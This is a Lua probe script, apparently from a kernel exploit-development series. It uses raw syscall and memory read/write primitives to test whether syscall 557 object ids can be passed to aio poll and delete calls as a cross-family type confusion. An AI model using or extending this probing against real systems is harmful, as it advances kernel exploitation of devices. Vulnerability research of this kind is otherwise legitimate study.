-- CRASH_CLASS: HIGH
-- PROBE 780a: 557 allocates an object in the aio id space
--
-- 779a: 557(ptr, 0x1000) returned 0x4205 and 557(ptr,0x1000,ptr2,0x800)
-- returned 0x0206 - the exact sequence a fresh aio create produces (488c).
-- The ids look like they come from the same allocator (13.60 offset
-- 0x3998e0). If they do, the aio operations may accept a 557 object and
-- treat it as an aio work item: a cross-family type confusion.
print("=== PROBE 780a: SYS 557 OBJECT ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local page=to_num(memory.alloc(0x2000)); zero(page,0x2000)
local out=to_num(memory.alloc(0x100)); local ids=to_num(memory.alloc(0x40))
local st=to_num(memory.alloc(0x40)); local fds=to_num(memory.alloc(0x20))
local D=to_num(memory.alloc(0x400))
local function poll(id)
    zero(out,0x100); wd(ids,id)
    local r=call(mk(664),ids,1,out,0,0,0)
    return r, rd(out)
end
local function del(id)
    zero(out,0x100); wd(ids,id)
    local r=call(mk(662),ids,1,out,0,0,0)
    return r, rd(out)
end
local function alive() return tostring(call(mk(20),0,0,0,0,0,0)) end
-- [A] what 557 does across repeated and varied calls
for i=1,3 do
    zero(page,0x2000)
    local r=call(mk(557),page,0x1000,0,0,0,0)
    print(string.format("[A%d] 557(page,1000)=%s alive=%s",i,tostring(r),alive()))
end
for _,sz in ipairs({0x10,0x100,0x8000}) do
    zero(page,0x2000)
    print(string.format("[B] 557(page,%X)=%s alive=%s",sz,tostring(call(mk(557),page,sz,0,0,0,0)),alive()))
end
-- [C] an aio create right after, to compare id sequences
zero(D,0x400); zero(st,0x40); zero(fds,0x20)
wd(fds,0xFFFF); wd(fds+4,0xFFFF)
call(mk(135),1,1,0,fds,0,0)
local s0=rd(fds); local s1=rd(fds+4)
wq(D+0x00,0); wq(D+0x08,16); wq(D+0x10,page); wq(D+0x18,out)
wd(D+0x20,s0); wd(D+0x24,0)
local cr=call(mk(669),0x1001,D,1,1,st,0)
local aid=rd(st)
print(string.format("[C] aio create=%s id=%08X pair=%s/%s alive=%s",tostring(cr),aid or 0,tostring(s0),tostring(s1),alive()))
-- [D] poll and delete the 557 id through the aio operations
zero(page,0x2000)
local id557=call(mk(557),page,0x1000,0,0,0,0)
print(string.format("[D] 557 id=%08X",to_num(id557)))
if type(id557)=="number" and id557>0 then
    local pr,ps=poll(id557)
    print(string.format("[D] aio poll(557id)=%s state=%s alive=%s",tostring(pr),ps and string.format("%08X",ps) or "nil",alive()))
    local dr,ds=del(id557)
    print(string.format("[D] aio delete(557id)=%s st=%s alive=%s",tostring(dr),ds and string.format("%08X",ds) or "nil",alive()))
end
-- [E] and the aio id through 560, which answered 0 for (ptr,size)
if type(aid)=="number" and aid>0 then
    print(string.format("[E] 560(aio page,1000)=%s alive=%s",tostring(call(mk(560),page,0x1000,0,0,0,0)),alive()))
    local dr2,ds2=del(aid)
    print(string.format("[E] aio delete(aioid)=%s st=%s alive=%s",tostring(dr2),ds2 and string.format("%08X",ds2) or "nil",alive()))
end
print("=== 780a DONE ===")
